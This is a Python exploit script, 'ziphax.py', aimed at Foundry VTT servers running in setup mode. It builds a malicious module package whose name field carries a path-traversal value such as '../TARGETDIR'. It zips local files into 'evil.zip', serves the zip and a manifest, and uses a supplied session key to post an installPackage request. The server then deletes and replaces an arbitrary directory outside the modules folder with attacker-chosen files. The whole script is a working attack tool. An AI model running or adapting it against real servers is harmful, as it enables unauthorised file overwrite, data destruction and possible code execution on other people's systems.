#!/usr/bin/env python3

import os
from os import path
import sys
import json
import uuid
import zipfile
import requests

if not len(sys.argv) > 1:
    raise SystemExit('usage: python ziphax.py <foundry instance url>')

foundry = sys.argv[1].rstrip('/')
try:
    if not '/setup' in requests.get(foundry, allow_redirects=False).text:
        print('make sure the server is running in setup mode.')
        print('if there is a game running, the gamemaster session can `return to setup` ;)')
        raise SystemExit()
except: raise SystemExit('check if your foundry url is correct!')

local = input('path to local dir youd like to upload [default:in]: ') or 'in'
while True:
    print('WARNING: remote directory will be deleted and recreated so all previous files will be lost!')
    remote = input('relative (to Data/modules) path to remote dir: ')
    if remote.endswith('/') or remote.endswith('/..') or remote.endswith('/.'):
        print('target must end in a directory name.')
        print('example: ../TARGETDIR')
    else: break


module = {
    'name': remote,
    'title': 'memes',
    'description': 'does memes n shit',
    'version': str(uuid.uuid4()),
    'minimumCoreVersion' : '0.7.9',
    'compatibleCoreVersion' : '0.7.9',
    'authors': [{ 'name': 'catnip', 'email': 'catnip@catnip.fyi', 'discord': 'catnip#0420' }],
    'esmodules': [ 'src/main.js' ],
    'languages': [{ 'lang': 'en', 'name': 'English', 'path': 'lang/en.json' }],
    'url': 'https://github.com/sum-catnip',
    'download': 'https://github.com/sum-catnip',
    'manifest': 'https://github.com/sum-catnip',
    'readme': 'https://github.com/sum-catnip',
    'changelog': 'https://github.com/sum-catnip',
    'bugs': 'https://github.com/sum-catnip'
}

if not os.path.exists('out'): os.mkdir('out')
with zipfile.ZipFile('out/evil.zip', 'w') as z:
    z.writestr('module.json', json.dumps(module))
    for r, d, fs in os.walk(local):
        for f in fs: z.write(path.join(r, f), path.relpath(path.join(r, f), local))

print('zip written to out/evil.zip.')
print('please upload this file somewhere publicly accessible.')
print('to locally server the file you can just cd into the `out` dir and run:')
print('python -m http.server 1337')
dl = input('download url to evil zip [default: http://localhost:1337/evil.zip]: ')
module['download'] = dl or 'http://localhost:1337/evil.zip'

with open('out/module.json', 'wt') as mf: mf.write(json.dumps(module))

print('please upload out/module.json somewhere publicly accessible.')
manifest = input('download url to manifest.json [default: http://localhost:1337/module.json]: ')
module['manifest'] = manifest or 'http://localhost:1337/module.json'

sess = input('enter session key: ')

with requests.Session() as rs:
    rs.cookies['session'] = sess
    print('installing package...')
    print(rs.post(f'{foundry}/setup', json={
        'action': 'installPackage',
        'type': 'module',
        'name': str(uuid.uuid4()),
        'manifest': module['manifest']
    }).text)
